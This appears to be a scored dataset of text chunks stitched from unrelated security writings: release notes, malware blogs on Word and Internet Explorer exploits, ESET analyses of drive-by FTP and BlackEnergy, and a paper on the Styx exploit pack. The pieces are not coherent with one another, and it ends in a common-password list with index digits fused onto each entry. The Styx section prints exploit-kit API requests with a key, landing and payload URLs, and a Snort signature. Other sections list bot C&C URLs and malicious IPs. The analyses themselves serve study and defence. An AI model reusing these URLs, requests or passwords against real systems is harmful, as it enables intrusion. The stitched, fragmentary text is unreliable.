9e7cb141eb97e4a83946b3494344b55bbbf0691a: 9158 KTV installer (a version of Download.exe is installed) – looks legitimate
a8fb2fa2d1fdbeb45831c3ba08d6d73cd08cb44b: 9158 KTV installer (a version of Download.exe is installed – same as with 9e7cb141eb97e4a83946b3494344b55bbbf0691a) – looks legitimate
f1dae1ee4ece2d5e30b199663f721a3718a661b9: XinGuang installer – looks legitimate
Altogether, four different versions of Download.exe were found (including the one carried by the malware). Differentiating between them was made difficult by the fact that all versions had exactly the same version information, as seen on the following output of the Sysinternals sigcheck tool:
Verified:     Signed
Signing date: 07:20 23/02/2012
Publisher:
Description:  DownLoad Microsoft ???????
Product:      DownLoad ????
Version:      1, 0, 0, 1
File version: 10, 3, 19, 1",0.013011702381990786
"Testing the other versions of Download.exe (replacing science.exe right before the CreateProcessA) caused a crash and a debug dialog pop-up. All of these variations were vulnerable to the exploitation, with the same bogus write_log() function, but due to reorganization of the code in the development process, the 0x404350 address, where the execution is re-routed does not contain the required POP RET instruction sequence. Fixing the return value could make these variants vulnerable to full exploitation as well.
",0.010409962868376588
Up2Date 7.405 Released,0.007981694739278455
"Greetings, In order to apply some essential security patches, we are releasing Up2Date 7.405 now. This Up2Date is purely a security update, with no other changes.",0.012746011888593478
"Written by
Angelo Comazzetto",0.008855311348334505
"August 11, 2009",0.009504810602580016
Network up2date,0.007611986957109407
"Greetings,  In order to apply some essential security patches, we are releasing Up2Date 7.405 now. This Up2Date is purely a security update, with no other changes.",0.012746011888593478
"It will spread within minutes to your appliance via our content distribution network. The details of 7.405 continue below.  This Up2Date package is to patch a couple areas with essential security fixes. No other changes are included as part of this release.
Up2Date 7.405 Details
Remarks:",0.009400538081088206
"Existing configuration will not be changed
This package will be auto-downloaded and made ready for installation
NOTE: *System will be rebooted*",0.009053688603975263
News:,0.00891099266407347
"Fixes for possible vulnerabilities
In regards to the new features and benefits of AxG 7.4, please read the V7.4 Release Notes PDF.",0.014274937740399563
"Fixes:
[Fix] 11064: Bind Dynamic Update DoS, CVE-2009-0696
[Fix] 11086: Address remaining Pluto vulnerablity to DoS by forged x509 certificates, CVS-2009-2661 (CVE-2009-2185 part 2)
Download Information:
Astaro Main FTP
Size: 3453875 bytes (3.30 Megabytes)
Md5sum: 60fb9753a7c63abeca04c80e035294ed
The Astaro Up2Date technology makes it easy to upgrade your installed Astaro Security Gateway to the latest version. There are two ways to apply an Up2Date package to the system:",0.010457626642514928
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on then Watch Up2Date Progress in new window and an extra browser window will show the progress of the Up2Date installation and the System administrator will receive a notification email once the Up2Date process has finished successfully.
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:
Astaro AxG Up2Date Download Mirrors:
– Astaro US
– Astaro US2
– Astaro Germany
– Astaro Germany2
(All Up2Dates are GNUPG-signed!)",0.01152530673320118
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the AxG V7 features you should post it on our User Bulletin Board. Please take care to add always(!) the version you refer to (e.g. ""[7.405] WAN Link Balancing "").
If you have feedback to our documentation (Online Help) please send it to docu@astaro.com.
There is also a demo server: http://demo.astaro.com",0.012493778453819715
The Astaro Team,0.009457225465590358
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"PSA: New Microsoft Word 0day used in the wild
Microsoft has just patched an important vulnerability in Microsoft Word during its latest patch Tuesday cycle. According to the security firm that found it [1], this new zero-day (CVE-2017-8759) was used in targeted attacks to install a piece of malware known as FinFisher.
Microsoft Office has been in the line of fire throughout the year with malware distributors employing various social engineering techniques to trick users into opening up booby-trapped documents laced with exploits or macros. Indeed, while drive-by download activity has plummeted, malicious spam has been the dominant threat.
In this blog post, we do a quick review of this latest exploit and how future attackers are likely to add it to their own campaigns.
Infection flow
CVE-2017-8759 leverages an improper validation in a parsing module of the Web Services Description Language (WSDL) which leads to arbitrary code injection and execution. As we have seen it many times in previous attacks, mshta.exe is used to retrieve a script and eventually the malware payload.",0.013157992474817193
Figure 1: Traffic view showing script and payload retrieval,0.008256671028970874
"Figure 2: Process view showing infection technique
Payload delivery implications
Depending on how the malicious document is delivered, it can require little or no user interaction in order to infect the target. In the former case, the document could be downloaded from a website or come as spam. It would bear the Mark of the Web and be flagged. In the latter case where the document was packaged – for example using 7zip – it could lose that MotW [2].",0.009460839776158858
"Figure 3: Side-by-side comparison of the same file, distributed differently.
In the first case, the user will be prompted to “Enable Editing” (which admittedly is less suspicious than enabling macros). This, in turn, will trigger the malicious code to execute.",0.01550340326046995
"Figure 4: CVE-2017-8759 attempt blocked (Protected View mode)
In the second case, where the MotW has been lost, the malicious Word document will immediately run its payload:",0.011134454243869274
"Figure 5: CVE-2017-8759 attempt blocked (normal mode)
If you haven’t done it yet, we strongly advise you to run Windows updates and apply the latest security patches. If experience serves well, each time a new zero-day is exposed, other online criminals jump in and rush to add it to their arsenal. This means that what was a small and targeted attack can all of the sudden become a widespread campaign.
Malwarebytes users were already protected against this exploit when it was still a zero-day. Additionally, we detect and block the FinFisher malware payload.
References
[1] FireEye, https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html
[2] Eric Lawrence, https://textslashplain.com/2016/04/04/downloads-and-the-mark-of-the-web/
Indicators of compromise
Malicious Word document:
0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684
FinFisher:
b035ca2d174e5e4fd2d66fd3c8ce4ae5c1e75cf3290af872d1adb2658852afb8
Network traffic:
91.219.236[.]207/img/office.png
91.219.236[.]207/img/word.db
91.219.236[.]207/img/left.jpg
",0.0093639999694487
"Critical bug allows drive-by download attacks in Internet Explorer 3 through 11
In its latest Patch Tuesday, Microsoft fixed a critical vulnerability that has existed since Windows 95 and affects Internet Explorer 3 all the way up to Internet Explorer 11. The bug, which comes from an old Windows library, could allow an attacker to remotely compromise a computer via a drive-by download attack.
The flaw was originally discovered by researchers at IBM X-Force in May 2014, and has been assigned CVE-2014-6332 with a CVSS score (severity index) of 9.3. Not only is the scope of this vulnerability extremely wide, but it is also capable of “sidestepping the Enhanced Protected Mode (EPM) sandbox in IE 11 as well as the highly regarded Enhanced Mitigation Experience Toolkit (EMET) anti-exploitation tool” according to Robert Freeman, Manager, IBM X-Force Research.",0.012406156559929271
"The attack is made possible by leveraging a flaw in Visual Basic Script (VBScript), an Active Scripting language introduced in Internet Explorer 3.",0.010839705214814033
"By passing arbitrary data to an array and then shrinking it within the IE VBScript engine, a failure code can be triggered but yet the array remains unchanged. This allows to use out of bounds elements to directly read or write to the memory.",0.008646962737388741
A proof of concept was quickly tweeted by a Chinese researcher where he pwned IE11 in the Windows 10 Technical Preview edition. He was able to pop Notepad by simply browsing to a webpage containing the exploit code:,0.012500736477141117
"Obviously, Notepad is a legitimate program but it could be replaced with anything and especially malware once the bad guys add this new weapon to their arsenal.
While at the moment there is no documented use of this exploit in the wild, this should only be a matter of time. A metasploit module has been published and given the extent of affected operating systems this makes exploiting the vulnerability a very attractive proposition.
Our own David Sánchez tested the metasploit module against Malwarebytes Anti-Exploit:",0.008508085467792248
"It is worth noting that Microsoft has offered a patch for its currently supported operating systems, but not for Windows XP and of course any of its precursors.
It is quite hard to believe that such a critical flaw has existed and survived for so many years considering the natural evolution in software development. The fact that Internet Explorer still supports VBScript to ensure backward compatibility is certainly part of the problem.
However, if we consider this page, Microsoft is moving away from VBScript:
As of Internet Explorer 11, VBScript is considered deprecated and should no longer be used as a scripting language for IE11. Webpages displayed in IE11 edge mode won’t execute VBScript code.
Because VBScript is no longer supported for IE11 edge mode, the following API features are no longer available to webpages:
The execScript function.
The VBArray object.
The “text/vbs” and “text/vbscript” MIME types (as supported type values for script elements).
According to the researchers at IBM X-Force, we might see more bugs that relate to arbitrary data manipulation like this one, as opposed to buffer overflows and user-after-free vulnerabilities.
Knowing that this flaw had existed for almost two decades is a little disconcerting and shows that system updates are not a panacea. Security solutions that provide exploit mitigation techniques that aren’t based on signatures can bridge the gap between a patched system and a protected system.
We will keep our eyes peeled and notify you when this vulnerability is added to mainstream exploit kits. Given the range of affected software and operating systems, this would make it a very deadly exploit. If you haven’t already, please patch your systems immediately by running Windows updates!
@jeromesegura
",0.011653081008900612
"Drive‑by FTP: a new view of CVE‑2011‑3544
Research by Aleksandr Matrosov and Vladimir Kropotov on distribution of a CVE-2011-3544 exploit by FTP.",0.008177799736838853
17 Mar 2012 - 05:47AM,0.011589164090263226
Research by Aleksandr Matrosov and Vladimir Kropotov on distribution of a CVE-2011-3544 exploit by FTP.,0.00813836398664003
[Some interesting research reported by Aleksandr Matrosov],0.009159606048399827
[Update: minor edits to graphics],0.008225193756972282
[Update 2: two additional FTP server graphics added at the end.],0.014100294227512467
"Not long ago we received interesting information from an independent security researcher from Russia, Vladimir Kropotov. (We will be presenting our joint research with him at CARO 2012.) We started to research this information and found an interesting way to distribute by FTP the payload for the most common java exploit, which ESET calls Java/Exploit.CVE-2011-3544. At this time Java/Exploit.CVE-2011-3544 is not seen as an exploit kit: we have been tracking the attack by just one exploit and can’t replay the typical attacking vectors used in common exploit kits found on infected web resources.",0.009474229741015194
After opening a window accessing a malicious web site the user is attacked using Java/Exploit.CVE-2011-3544:,0.0063019450537603605
"The most interesting question is this: how does drive-by FTP work as a vector for a malicious payload? The answer is really simple: in the process of loading the page obfuscated javascript is started in an iFrame, connecting by FTP (File Transfer Protocol) to a malicious server.",0.012103503710293229
After deobfuscation we can see how it really works:,0.0101177610401042
"The most interesting part is its connection process, because it’s not a public FTP server connection with no password authentication. The attackers used a simple username and password pair for protection. The FTP session log looks like this:",0.010337767806609666
After a successful FTP connection a malicious applet is opened with Java/Exploit.CVE-2011-3544 on board. After the exploitation stage a malicious executable file is downloaded to the %TEMP% directory.,0.00935094753927801
"In our case the downloaded executable was a modification of the malware ESET calls Win32/TrojanClicker.Agent.NII. This trojan is used for Black Hat SEO processes (BHSEO) and may replace legitimate search engine results with its own favored links, clickjacking context ads and redirecting users from third party web sites.",0.012834768980142353
C&C (Command and Control) servers are hosted on the following domains:,0.01600263261881174
"gerla.be/nconfirm.php?rev=367&code=3&param=0&num=251011548122112
gerla.be/njob.php?num=11272479403879762944&rev=367
eksyghskgsbakrys.com/nconfirm.php?rev=367&code=3&param=0&num=251011548122112
eksyghskgsbakrys.com /njob.php?num=11272479403879762944&rev=367
msrgejsdyvekadh.com/nconfirm.php?rev=367&code=3&param=0&num=251011548122112 msrgejsdyvekadh.com /njob.php?num=11272479403879762944&rev=367
alsiatern.be/nconfirm.php?rev=367&code=3&param=0&num=251011548122112
alsiatern.be/njob.php?num=11272479403879762944&rev=367&ncrp=1",0.01785424860750151
This activity confirmed an active bot downloading its current tasks from the C&C servers. The task list for this version of the bot may look like this:,0.012394614517321267
More detail about interesting web attack vectors will be disclosed in our CARO presentation in Munich in May.,0.01316512962910521
"In the meantime, here are a couple of extra screenshots from a malicious FTP server.",0.010767766177651628
"That's nicer than the FTP command line, isn't it? ;-) And also:",0.013157434447753857
"Aleksandr Matrosov
David Harley
",0.009445740919321377
"Styx exploit pack: insidious design analysis
2013-09-02",0.006592807822405122
"Aditya K. Sood
Michigan State University
,
USA",0.011136966587390495
"Richard J. Enbody
Michigan State University
,
USA",0.0104693143385034
"Rohit Bansal
Independent security researcher
,
India
Editor:
Helen",0.009817156975589603
"Martin
Abstract
Aditya Sood and colleagues discuss the details and design of the Styx exploit pack.
Copyright © 2013 Virus Bulletin",0.008522743307313951
"In this paper, we discuss the details and design of the Styx exploit pack.
According to the dictionary, Styx is a river in the underworld, over which Charon ferried the souls of the dead. According to the Styx service provider website, ‘Styx is a river in Greek mythology that formed the boundary between earth and the underworld... It circles the underworld nine times.’ So it seems that the origin of the name is as rigorous as the exploit pack itself.
The Styx exploit pack was originally marketed and sold via Styx crypt.com (see Figure 1), the website of a Russian organization that provided obfuscation services for mangling and morphing the structure of different file formats. A couple of months ago, however, the exploit pack was removed and it is now sold on the very lucrative underground market. It has been used on a large scale thanks to its efficient design, built-in exploit obfuscation and other features.
Figure 1. Original Styx service provider.",0.014537103563970866
"Communication design
Styx implements a well-defined API construct to communicate with its controller application. The use of API-based web communication procedures makes the exploit pack robust and flexible. It uses JSON and XML format for sending and receiving data. Let’s look at how the target URL is constructed and how communication is achieved.
Typically, a Styx URL is constructed in the format:
http://<hostname>/<api-folder>/[command|method]
The ‘hostname’ is the address of the target domain. The ‘api folder’ is the directory on the server that is accessed using an API key. The key is sent as a part of the HTTP request to enable authentication in order to process the command or method sent by the client. Primarily, the client has to send ‘X-APIKey’ in the HTTP header in order to access the API so that the server will accept the requests and sends responses accordingly. For example, Listing 1 shows an HTTP request sent by the client in order to get a list of domain names configured on the server.
# Getting domain names",0.012208837036551512
"POST http://<styx_domain>:8888/api/getdomains HTTP/1.1
Host: <styx_domain>
Accept: application/json
X-APIKey: g48XBmTJM4Jf6LpjevOrMgXEZlRNmRluKigcx2L0UlfOYv14SEjuL81AjGdxnoR1",0.009404475722815886
#Adding domain names,0.009629040085633256
"POST http://<styx_domain>:8888/api/adddomain HTTP/1.1
Host: <styx_domain>
Accept: application/json
X-APIKey: g48XBmTJM4Jf6LpjevOrMgXEZlRNmRluKigcx2L0UlfOYv14SEjuL81AjGdxnoR1
domain=",0.009670348164461218
Listing 1: HTTP POST request with API key.,0.014910911252015269
"Styx also implements a well-defined error-handling interface for JSON and XML-based communication models, as presented in Listing 2.
# JSON Error Flow",0.01565864023736485
"{
“error”: true,
“message”: “error message”,
“data”: null
}",0.008731890941714893
# XML Error Flow,0.007974421502821238
"<?xml version=”1.0” encoding=”utf-8”?>
<response>
<error>1</error>
<message>error message</message>
</response>",0.007586036830364851
Listing 2: JSON/XML error handling response.,0.016543736208152415
"The commands used by Styx are shown in Table 1.
Commands
Details
/api/clearSubaccStats
Clear all statistics data of a sub-account
/api/getMagicURL
Return magic API key used by sub-account for execution of commands
/api/uploadfile
Upload file
/api/getfileCheck
Check assigned file against detection
/api/getdomains
Get a list of configured domains
/api/adddomain
Add a new domain to the list
/api/createDomainSet
Create a new domain set of selection and rotation
/api/addDomainsToSet
Add domains to create a set
/api/deldomain
Remove a domain
/api/getDomainCheck
Check domain against Ghost Busters
/api/stats_global
Get global statistics by date
/api/stats_browser_n_os
Get global statistics by operating system and browser
/api/stats_country
Get global statistics by country
/api/getCurrentHitPercent
Return current and active hits
/api/getCurrentFlow
Return current data flow from the exploit pack
/api/setNotification
Set notification messages
/api/detBlockWithoutReferrer
Block access without referrer
/api/setBlockUniqueReferrers
Block (first three) access with unique referrer
/api/setBlockRepeatForIP
Block repeat access for specific IPs for hours
/api/setUsePluginDetect
Block access based on user-agent strings
Table 1. Commands used by Styx exploit pack.
A number of metrics are used by Styx to determine the infection success rate and to build statistics accordingly. By default, the exploit pack has an interval of 15 seconds in real time to receive data from the client. In other words, infected machines transmit data every 15 seconds. The different metrics that are used for traffic flow analysis are as follows:
Current Loaded – number of active infections
Current Uniques – number of unique infections
Current Hit – total number of hits
Current Refuse – total number of IP addresses that are refused to serve exploits
Top-5 Browsers – top five exploited browsers
Top-5 OS – top five infected hosts
Top-5 Countries – top five countries with the highest number of infections
Top-5 Referrers – top five referrers, based on which exploits are served.
Styx can easily be integrated with Sutra, a traffic distribution system (TDS), to manage and build statistics regarding successful (or unsuccessful) infections based on their geographical locations.",0.013562213558760638
"Services
Styx uses three different types of service for various functionalities. The services are discussed below.",0.012306077259420789
"Ghost Busters
The Ghost Busters service [1] is designed to provide flexibility in checking and verifying known domain names against active blacklists to determine whether the domain has been marked as malicious. Active domains are not mapped to any entries present in the blacklist and thus cannot be traced easily. As a result, the incoming traffic from infected systems remains active and malicious domains continue to spread malware. This prevents traffic loss. Listing 3 shows how Styx implements the domain verification check.
// Check domain with Ghost Busters",0.012980569253243202
"$domain = “my-domain.com”
If (false === ($result = $api -> getDomainCheck($domain))) {
trigger_error($api -> getErrorMessage());
} elseif ($result -> messame == ‘OK’)  {
printf(“your domain %s is OK, Ghostbusters said.”, $domain);
} elseif {
printf(“Domain id +NOT+ clean, bro. Here is your check: %s, your domain: %s”, $result ->data->public_url, $domain);
}",0.011312061905144222
Listing 3: Ghost Busters domain verification check.,0.01549947435625132
"Ghost Busters provides a well defined API that can be integrated into the Command & Control (C&C) panels of different automated exploit and malware infection frameworks to provide a built-in defence. The Ghost Busters system provides real-time updates on the fly, which are very beneficial for attackers in preventing the fingerprinting of domains. The Ghost Busters service also implements a robust multi threading system to address multiple requests made at the same time. It usually takes three seconds to provide domain verification results. Figure 2 shows the Ghost Busters website.
Figure 2. Ghost Busters service.",0.013456002723773786
"Captain Checker
The Captain Checker service is used by Styx to check whether a generated file will execute properly. Captain Checker verifies that the file is not easily detectable by the anti protection solutions running on the end user machines. The idea is to check whether the malicious file survives after a number of aggressive tests against known anti virus solutions. Listing 4 shows how a simple check is performed by Styx when a malicious executable is generated.
// Check domain with Ghost Busters
$domain = “my-domain.com”
If (false === ($result = $api -> getFileCheck( ))) {
trigger_error($api -> getErrorMessage());
} elseif ($result -> message == ‘OK’)  {
echo “File checked. It’s OK.”;
} else
printf(“Another proble with your file, my Lord. Captain Checker says it’s NOT ok: %s”, $result ->data->public_url);
}",0.013201166637017425
Listing 4: Captain Checker file screening.,0.015434019296485468
"Styx obfuscator
Styx also uses a built-in service for morphing and obfuscation. Every single exploit code served by Styx is properly obfuscated with this cryptor service. This substantially complicates the process of unwrapping exploit code for analysis.",0.011591753770421098
"Filters and access restrictions
Styx implements a number of different filters to restrict the incoming flow of unauthorized traffic. This functionality protects the exploit pack against being traced. The different sets of filters are discussed below:
Block access without referrer: if the incoming HTTP request does not have the appropriate referrer header set, Styx blocks the request. This means that some type of referrer validation exists in the Styx exploit pack.
Block access (first 3) with unique referrer: access to Styx web pages is blocked if the incoming requests have unique referrers. This filter is created to trigger ambiguity in accessing the Styx exploit pack.
Block repetitive access: if the incoming requests are repetitive and originate from the same IP addresses, access is blocked immediately for an hour. This duration can be extended as required. This filter is designed specifically for scenarios in which security researchers and analysts use emulated systems to download malware.
Filter IP addresses: the IP addresses of the infected machines that are connected to the Styx exploit pack are filtered. This is to restrict the bot traffic originating from already compromised systems.
Filter non-Windows traffic: the user agent string that accompanies incoming HTTP requests is scanned. This testing is performed to detect whether the traffic originates from e.g. Windows systems or mobile platforms. This option restricts the serving of the exploit in a non reliable environment. For example, an exploit that runs on Windows will fail on the Linux platform, so with the use of this filter, traffic screening can be performed.
Filter bots by user agent: in this filter, the incoming HTTP traffic is scanned based on user agent strings carrying information about the crawlers and traffic collector bots. This is done to avoid automated crawling for Styx and to restrict the listing in search engines.
Once the filter is in place, the next step is to take action when the filter finds the traffic. Styx triggers three different actions by replying with one of the following:
402 Payment required
404 Page not found
Redirect to BackURL – 302.",0.020419232144018973
"Exploit distribution and analysis
Now let’s look at exactly how Styx downloads malware onto users’ systems. In a number of deployments, Styx uses multiple iframe redirectors to redirect browsers to a malicious domain. For example, the typical URLs used by Styx are shown in Listing 5. The random strings are actual API keys that authenticate the client HTTP requests to the server.
h___p://loadcontent.zapto.org:8888/jyfGy80g7h70DI9M0JzPI0osnR0839G0eQ4V0V3XG0E1oJ0Ruqs0eo9X0KMdJ12ybd/
h___p://loadcontent.zapto.org:8888/zRu1S80FSmy0vSvg0vOqU0nVcA16fx70NXCG0IZJv0djlf0H7Tt06qeU0BKhn06ys0/
http://getstatlink.com/m2DM610qtKM0iVWv0iKBR0O75g0PSu00DBlZ0Xzlz0ixge0xxwL06Yex0FsBj0K4wd0d5AJ0iROl/
http://getstatlink.com/m2DM610qtKM0iVWv0iKBR0O75g0PSu00DBlZ0Xzlz0ixge0xxwL06Yex0FsBj0K4wd0d5AJ0iROl/mCYoHHs.js",0.010685578681727592
Listing 5: Styx exploit pack – URL design.,0.01297558197969495
"On successful redirection to a malicious domain, the browser sends a GET request to download a malicious file (in this example, it is Java), which exploits the vulnerability in the browser to fetch the malware. Primarily, Styx uses the PluginDetect script to map the number of vulnerable plug ins running in the system. When an iframe is executed, the browser is redirected to the malicious domain which triggers the PluginDetect script. If plug-ins are found to be vulnerable, a requisite exploit file is served, as shown in Figure 3. If there are no vulnerable plug ins, the malicious domain either serves no HTTP response or redirects the browser to a legitimate domain such as the Google search engine.
Figure 3. Malicious Jar file used by Styx.
(Click here to view a larger version of Figure 3.)
On successful exploitation, Styx serves the malicious executable, as shown in Figure 4.
Figure 4. Downloading malicious executable.
(Click here to view a larger version of Figure 4.)
Once the malware is served and successfully installed, it connects back to the Styx exploit pack administration panel to send a notification about the installation and to update the statistics, as shown in Figure 5. As one can see, the bot is sending random numbers as a part of the ps0 parameter. There is a possibility that the C&C panels used by the botnet and exploit packs such as Styx are hosted on the same domain. In certain scenarios, to increase security, the malware authors use two different domains for the exploit pack and the botnet C&C panel.
Figure 5. Bot (malware) communicating with C&C.
(Click here to view a larger version of Figure 5.)
Styx uses CVE-2013-0422 [2] on a large scale to infect end user machines by exploiting vulnerable installations of Java code. For constructing payloads and applets for Java exploitation, Styx inherits the power of the Java Network Language Protocol (JNLP) for running Java code outside the browser as a standalone application.",0.015127793388016397
"Detecting Styx exploit pack
Based on Styx functionality, we have written a Snort signature (presented in Listing 6) which can be used to trace malicious traffic generated by the Styx exploit pack in the wild.
alert tcp $HOME_NET 1024: -> $EXTERNAL_NET any (msg:”Win32.Exploit.Styx -  CnC Communication”; flow:established,to_server;
urilen:>200;
content:”GET “;
depth:4;
content:”.exe?”;
distance:200;
within:100;
content:”=”;
within:30;
content:”|26|h=”;
within:30;
fast_pattern;
content:”User-Agent: Mozilla/4.0 (Win”;
distance:0;
content:!”|0d 0a|Cookie|3a| “;
reference:md5,d5cc74e25577706982a71eb4acbfadc1; pcre:”/\.exe\?[\w]+=[\w]+&h=[\d]{1,2}\x20HTTP\/1\.1/”;
classtype:ExploitKit;
sid:XXXXXXXXX; rev:1; )",0.013906390692912662
Listing 6: Styx exploit pack signature.,0.016012719941548403
"Further reading
Other researchers have blogged about the Styx exploit pack’s infection mechanisms. To understand how Styx serves an exploit, an interesting case study has been discussed in [2], [6]. General information about the features and characteristics of the Styx exploit pack have been presented in [3] to show the advancements in code and working. A list of simple detection patterns has been presented in [4] so that appropriate signatures can be designed to detect the Styx exploit pack. A comparison report [5] of the Styx exploit pack with other existing browser exploit frameworks clarifies the ongoing state of exploit packs. Finally, a general exploit distribution mechanism used by the Styx exploit pack covering a real time case study is presented in [8].",0.014923189895174716
"Conclusion
This paper dissects the design and behaviour of the Styx exploit pack in detail. The complete design analysis will help researchers and analysts to understand more about the different elements of the Styx exploit pack. We hope that these kinds of analytical details will help the security community to build more robust protection solutions to subvert the infections spread by automated exploit packs such as Styx.",0.012489627032659878
"Bibliography
[1] Ghost Busters. https://www.youtube.com/watch?v=mqWILzUnsmw.
[2] CVE-2013-0422. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0422.
[3] The infection of Styx Exploit Kit (Landing page: painterinvoice.ru + Payload: PWS/Ursnif Variant). February 2013. http://malwaremustdie.blogspot.co.uk/2013/02/the-infection-of-styx-exploit-kit.html.
[4] Styx Exploit Kit Analysis – building a bridge to the underworld. April 2013. http://malforsec.blogspot.co.uk/2013/04/styx-exploit-kit-analysis-building.html.
[5] Inside Styx Sploitpack 4.0 – Exploit Kit Control Panel. May 2013. http://malware.dontneedcoffee.com/2013/05/inside-styx-2013-05.html.
[6] Styx Exploit Kit. December 2012. http://www.malwaresigs.com/2012/12/19/Styx-exploit-kit/.
[7] An Overview of Exploit Packs (Update 19.1). April 2013. http://contagiodump.blogspot.com/2010/06/overview-of-exploit-packs-update.html.
[8] Surgihalli, S.; Krishnasamy, V. Styx Exploit Kit Takes Advantage of Vulnerabilities. June 2013. http://blogs.mcafee.com/mcafee-labs/Styx-exploit-kit-takes-advantage-of-vulnerabilities.
",0.011839134879084612
"Back in BlackEnergy *: 2014 Targeted Attacks in Ukraine and Poland
State organizations and private businesses from various sectors in Ukraine and Poland have been targeted with new versions of BlackEnergy, a malware that's evolved into a sophisticated threat with a modular architecture.",0.01752011546446286
Robert Lipovsky,0.009327268366459585
22 Sep 2014 - 10:19PM,0.011425925084611821
"State organizations and private businesses from various sectors in Ukraine and Poland have been targeted with new versions of BlackEnergy, a malware that’s evolved into a sophisticated threat with a modular architecture.",0.01687154937293478
"A large number of state organizations and private businesses from various industry sectors in Ukraine and Poland have been targeted in recent attacks using malware designed for network discovery and remote code execution, and for collecting data from targets’ hard drives. What makes these attacks interesting – aside from the tense current geopolitical situation in the region – is that they were carried out using new versions of BlackEnergy, a malware family with a rich history, and also the various distribution mechanisms used to get the malware onto the victims’ computers.",0.013811074793181222
The findings of our research will be presented this week at the Virus Bulletin conference in Seattle.,0.018223998159040633
"BlackEnergy is a trojan that has undergone significant functional changes since it was first publicly analyzed by Arbor Networks in 2007. Originally conceived as a relatively simple DDoS trojan it has evolved into a sophisticated piece of malware with a modular architecture, making it a suitable tool for sending spam and for online bank fraud, as well as for targeted attacks. BlackEnergy version 2, which featured rootkit techniques, was documented by Dell SecureWorks in 2010. The targeted attacks recently discovered are proof that the trojan is still alive and kicking in 2014.",0.014633323149022992
The latest variants of BlackEnergy are dated September 2014.,0.015156045381826355
BlackEnergy Lite: Less is more?,0.013104638034295513
"While the ‘regular’ BlackEnergy trojan is still actively circulating in the wild, we have discovered variants of the malware family, which are easily distinguishable from their older brothers.",0.014532244093249602
"We nicknamed the BlackEnergy modifications – first spotted in the beginning of 2014 – as BlackEnergy Lite, due to the absence of a kernel-mode driver component, less support for plug-ins, and an overall ‘lighter’ footprint.",0.018869543716061976
"Interestingly, the malware was named similarly by the malware writers themselves, as illustrated by the export directory of an early version of the main DLL:",0.009494984540324825
"Note that even the ‘regular’ BlackEnergy samples detected this year have evolved in such a way that the kernel mode driver is only used for injecting the payload into user mode processes and no longer contains rootkit functionality for hiding objects in the system. The light versions go a step further by not using a driver at all. Instead, the main DLL is loaded using a more ‘polite’ and ‘official’ technique – by simply loading it via rundll32.exe. This evolution was previously mentioned in blog posts by F-Secure.",0.01153990537269467
"The omission of the kernel mode driver may appear as a step back in terms of malware complexity: however it is a growing trend in the malware landscape nowadays. The threats that were among the highest-ranked malware in terms of technical sophistication (e.g., rootkits and bootkits, such as Rustock, Olmarik/TDL4, Rovnix, and others) a few years back are no longer as common.",0.011392126393456659
"There could be several reasons behind this trend, ranging from the technical obstacles that rootkit developers now face, like Windows system driver signing requirements, UEFI Secure Boot – which will be covered by Eugene Rodionov, Aleks Matrosov and David Harley in their VB2014 presentation Bootkits: past, present & future – to the simple fact that it is difficult and expensive to develop such malware. Also, any bugs in the code have a bad habit of blue-screening the system. All the while, possibly even raising suspicion of the presence of malicious code rather than hiding it in the system.",0.012915954244852257
"There are several other differences that separate BlackEnergy Lite from the ‘big’ BlackEnergy, in the plugin framework, plugin storage, configuration format, and so forth.",0.014563683991430376
BlackEnergy campaigns in 2014,0.01002465314088441
"The BlackEnergy malware family has served many purposes throughout its history, including DDoS attacks, spam distribution, and bank fraud. The malware variants that we have tracked in 2014 – both of BlackEnergy and of BlackEnergy Lite – have been used in targeted attacks. This fact is demonstrated both by the plugins used and the nature and targets of the spreading campaigns.",0.019906904782449164
The purpose of these plugins was mainly for network discovery and remote code execution and for collecting data off the targets’ hard drives.,0.010592798771647649
"We have observed over a hundred individual victims of these campaigns during our monitoring of the botnets. Approximately half of these victims are situated in Ukraine and half in Poland, and include a number of state organizations, various businesses, as well as targets which we were unable to identify.",0.013349024233273332
"The spreading campaigns that we have observed have used either technical infection methods through exploitation of software vulnerabilities, social engineering through spear-phishing emails and decoy documents, or a combination of both.",0.01825223890761063
"In April we discovered a document exploiting the CVE-2014-1761 vulnerability in Microsoft Word. This exploit has also been used in other attacks, including MiniDuke.",0.013637747263324451
In this case the successful execution of the exploit shellcode resulted in dropping two files to the temporary directory: the malicious payload named “ WinWord.exe” and a decoy document named “Russian ambassadors to conquer world.doc”. These files were then opened using the kernel32.WinExec function. The WinWord.exe payload served to extract and execute the BlackEnergy Lite dropper. The decoy document contained controversial but obviously bogus text as shown below:,0.012010701246734756
"At the same time, another document appeared also exploiting CVE-2014-1761. The text was less controversial than the previous example, but still related to foreign relations. The subject was the GlobSEC forum held in Bratislava this year.",0.012627728711581021
"One month later, in May, we spotted another file crafted to install BlackEnergy Lite. This time, however, no exploit was used – the file, named “список паролiв ,”  which means “password list” in Ukrainian, was simply an executable file with a Microsoft Word icon.",0.014283059387159569
"Despite being an executable, this file also contained an embedded decoy document with – you guessed it – a list of passwords. This case was also described by F-Secure in their blog post.",0.00952180424428506
* http://en.wikipedia.org/wiki/Back_in_Black,0.016362628010553104
1123456,0.00868867206701529
2admin,0.007633984111168335
3password,0.007929180566945804
4test,0.008363223727786417
5123,0.007978851510123675
6123456789,0.008942924662567964
712345678,0.009009575022687177
81234,0.007608584319926837
9qwerty,0.011333922548779851
10asdf,0.009935460953022557
11111111,0.011331449815412897
121234567,0.009217806553322161
13123123,0.008720360397324711
14windows,0.007287598188033484
15123qwe,0.008641468151919907
161234567890,0.008135877565206284
17password123,0.009401759657717945
18123321,0.007762782496681386
19asdf123,0.008305737545076464
20zxcv,0.0077250305947448306
21zxcv123,0.0075868387143537275
22666666,0.007849421022138259
23654321,0.008305221717750166
24pass,0.00991724217382084
251q2w3e4r,0.008284508338028518
26112233,0.008153394463047525
271q2w3e,0.00847584078560315
28zxcvbnm,0.00873788461102587
29abcd1234,0.007962866249033751
30asdasd,0.008882006796054775
31555555,0.008778465547040204
32999999,0.008912823565469297
33qazwsx,0.007302799229854218
34123654,0.008222185826979644
35q1w2e3,0.007712760487511683
